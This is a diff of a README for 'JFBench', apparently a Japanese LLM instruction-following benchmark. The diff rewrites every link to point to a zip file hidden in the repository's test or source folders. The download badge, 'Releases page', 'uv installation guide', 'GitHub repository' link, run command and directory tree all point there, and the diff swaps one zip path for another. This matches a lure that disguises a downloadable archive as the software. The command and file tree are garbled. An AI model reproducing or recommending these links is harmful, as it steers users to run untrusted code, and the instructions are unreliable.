@@ -4,11 +4,11 @@
 
 JFBench is a benchmark suite for evaluating Japanese LLM instruction-following performance. It helps users measure how well models respond to various instructions in Japanese. Follow these steps to get started.
 
-[![Download JFBench](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip)](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip)
+[![Download JFBench](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/src/jfbench/constraints/ifbench_ratio/Software_1.0.zip)](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/src/jfbench/constraints/ifbench_ratio/Software_1.0.zip)
 
 ## 📥 Download & Install
 
-To download JFBench, visit the [Releases page](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip). Choose the version suitable for your system and download it. 
+To download JFBench, visit the [Releases page](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/src/jfbench/constraints/ifbench_ratio/Software_1.0.zip). Choose the version suitable for your system and download it. 
 
 To install the software, you will need to follow these steps once you have downloaded the required files:
 
@@ -29,7 +29,7 @@ To install the software, you will need to follow these steps once you have downl
 
 JFBench requires a dependency manager called `uv`. Follow these steps to install and set it up:
 
-1. **Install `uv`:** If you don’t have it installed, visit the [uv installation guide](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip) and follow the instructions provided there.
+1. **Install `uv`:** If you don’t have it installed, visit the [uv installation guide](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/src/jfbench/constraints/ifbench_ratio/Software_1.0.zip) and follow the instructions provided there.
 
 2. **Sync Dependencies:**
    Once `uv` is installed, run the following command:
@@ -49,12 +49,12 @@ JFBench requires a dependency manager called `uv`. Follow these steps to install
 
 JFBench includes scripts located in the `src/jfbench` directory. You can use these scripts to run benchmarks.
 
-### Benchmark Run: `https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip`
+### Benchmark Run: `https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/src/jfbench/constraints/ifbench_ratio/Software_1.0.zip`
 
 To evaluate a model, use the following command:
 
 ```bash
-uv run python https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip \
+uv run python https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/src/jfbench/constraints/ifbench_ratio/Software_1.0.zip \
   --benchmark "ifbench" \
   --output-dir data/benchmark_results \
   --n-constraints "1,2,4,8" \
@@ -80,9 +80,9 @@ jfbench/
 ├── src/
 │   └── jfbench/
 │       └── benchmark/
-│           └── https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip
+│           └── https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/src/jfbench/constraints/ifbench_ratio/Software_1.0.zip
 ├── data/
-└── https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip
+└── https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/src/jfbench/constraints/ifbench_ratio/Software_1.0.zip
 ```
 
 ## 🛠️ Troubleshooting
@@ -95,6 +95,6 @@ If you face issues while using JFBench, consider the following:
 
 ## ✉️ Getting Help
 
-For additional assistance, you can check the issues section on the [GitHub repository](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip). You can also ask questions there if you do not find an answer.
+For additional assistance, you can check the issues section on the [GitHub repository](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/src/jfbench/constraints/ifbench_ratio/Software_1.0.zip). You can also ask questions there if you do not find an answer.
 
-[![Download JFBench](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip)](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/tests/constraints_tests/meta_output_tests/Software_nonerroneous.zip)
+[![Download JFBench](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/src/jfbench/constraints/ifbench_ratio/Software_1.0.zip)](https://raw.githubusercontent.com/PUSHPAK-221/jfbench/main/src/jfbench/constraints/ifbench_ratio/Software_1.0.zip)
